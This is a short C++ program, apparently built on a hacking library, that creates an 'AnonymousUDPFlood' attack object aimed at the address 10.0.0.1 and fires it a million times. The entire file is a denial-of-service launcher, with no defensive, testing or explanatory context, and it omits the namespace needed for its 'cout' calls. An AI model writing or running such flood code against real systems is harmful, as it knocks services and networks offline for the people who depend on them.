#include "ksng/hack/incision.h"

int main() {

	incision::AnonymousUDPFlood atk("10.0.0.1");
	cout << "loaded attack" << endl;
	atk.attack(1000000, false, true);

}
